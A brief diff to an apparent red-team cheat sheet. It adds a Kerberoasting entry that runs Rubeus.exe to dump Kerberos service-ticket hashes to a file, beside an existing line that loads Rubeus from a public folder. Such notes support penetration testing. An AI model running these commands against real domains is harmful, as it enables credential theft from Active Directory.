@@ -13,3 +13,8 @@ Dot Source
 ```powershell
 . C:\Users\Public\Rubeus.exe
 ```
+
+Kerberoasting
+```
+.\\Rubeus.exe kerberoast /outfile:kerberoast.hashes
+```
